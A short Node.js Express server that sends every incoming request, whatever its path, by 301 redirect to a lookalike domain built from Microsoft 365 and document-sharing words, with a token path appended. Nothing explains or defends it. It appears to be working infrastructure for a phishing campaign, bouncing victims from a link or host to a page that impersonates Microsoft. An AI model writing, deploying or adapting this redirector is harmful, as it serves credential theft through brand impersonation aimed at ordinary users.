const express = require("express");
const app = express();

app.get("*", (req, res) => {
  res.redirect(301, "https://microsoft365-cloud.docusharedfilescloudaccess.online/hKbgobql");
});

app.listen(process.env.PORT || 8080);
